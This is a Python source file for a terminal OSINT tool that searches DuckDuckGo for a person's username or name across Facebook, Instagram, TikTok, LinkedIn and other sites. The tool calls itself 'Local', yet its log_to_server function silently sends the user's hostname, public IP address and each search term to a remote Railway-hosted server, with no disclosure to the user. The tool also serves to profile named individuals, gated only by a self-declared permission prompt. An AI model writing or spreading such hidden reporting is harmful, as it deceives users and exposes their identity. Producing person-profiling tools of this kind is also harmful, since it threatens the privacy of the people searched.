# tool.py
import os
import platform
import time
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init

init(autoreset=True)

SERVER_URL = "https://osint-tool-production.up.railway.app/log_search"

PLATFORMS = {
    "Facebook": "facebook.com",
    "Instagram": "instagram.com",
    "Youtube": "youtube.com",
    "TikTok": "tiktok.com",
    "Snapchat": "snapchat.com",
    "Reddit": "reddit.com",
    "Twitter": "twitter.com",
    "Pinterest": "pinterest.com",
    "LinkedIn": "linkedin.com",
}

REQUEST_DELAY = 0.3

def log_to_server(search_term):
    try:
        ip = requests.get("https://api64.ipify.org?format=json", timeout=5).json().get("ip", "0.0.0.0")
    except:
        ip = "0.0.0.0"
    payload = {
        "username": platform.node(),
        "ip": ip,
        "search": search_term,
        "timestamp": str(int(time.time()))
    }
    try:
        requests.post(SERVER_URL, json=payload, timeout=5)
    except:
        pass

def duckduckgo_search_links(query, site=None, num_results=10):
    search_query = f"{query} site:{site}" if site else query
    links = []
    try:
        url = "https://html.duckduckgo.com/html/"
        resp = requests.get(url, params={"q": search_query}, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        anchors = soup.select("a.result__a")
        for a in anchors:
            href = a.get("href")
            if href and href.startswith("http"):
                links.append(href)
            if len(links) >= num_results:
                break
    except:
        pass
    return links

def print_platform_frame(platform_name, links):
    header = f"{platform_name} - {len(links)}/10"
    top = "╭─ " + header + " ─╮"
    bottom = "╰" + "─" * (len(top) - 2) + "╯"
    print(Fore.BLUE + top + Style.RESET_ALL)
    if links:
        for link in links[:10]:
            print(Fore.CYAN + f"   {link}")
    else:
        print(Fore.RED + "   No results found.")
    print(Fore.BLUE + bottom + Style.RESET_ALL)
    print()

def main():
    ascii_art = r"""
 /$$$$$$$                                   /$$$$$$$$
| $$__  $$                                 |_____ $$/ 
| $$  \ $$ /$$   /$$  /$$$$$$         /$$$$$$   /$$/  
| $$$$$$$ | $$  | $$ /$$__  $$       /$$__  $$ /$$/   
| $$__  $$| $$  | $$| $$  \ $$      | $$  \__//$$/    
| $$  \ $$| $$  | $$| $$  | $$      | $$     /$$/     
| $$$$$$$/|  $$$$$$/|  $$$$$$$      | $$    /$$/      
|_______/  \______/  \____  $$      |__/   |__/       
                     /$$  \ $$                        
                    |  $$$$$$/                        
                     \______/                         
"""
    print(Fore.GREEN + ascii_art + Fore.RED + "OSINT Tool - Local DuckDuckGo v1.0\n" + Style.RESET_ALL)

    while True:
        identifier = input(Fore.CYAN + "[?] Enter username or firstname and lastname: " + Style.RESET_ALL).strip()
        if not identifier:
            print(Fore.RED + "[!] No input provided.")
            continue

        while True:
            confirm = input(Fore.YELLOW + "[?] Do you have permission to search this account? (yes/no): " + Style.RESET_ALL).strip().lower()
            if confirm in ("yes", "y"):
                break
            elif confirm in ("no", "n"):
                print(Fore.RED + "[!] Permission not confirmed. Exiting.")
                return
            else:
                print(Fore.RED + "[!] Invalid input. Please answer 'yes' or 'no'.")

        log_to_server(identifier)

        for platform_name, domain in PLATFORMS.items():
            links = duckduckgo_search_links(identifier, domain)
            print_platform_frame(platform_name, links)
            time.sleep(REQUEST_DELAY)

        again = input(Fore.MAGENTA + "[?] Do you want to search again? (yes/no): " + Style.RESET_ALL).strip().lower()
        if again not in ("yes", "y"):
            print(Fore.GREEN + "\n[✔] Exiting OSINT tool. Bye 👋")
            break

if __name__ == "__main__":
    main()
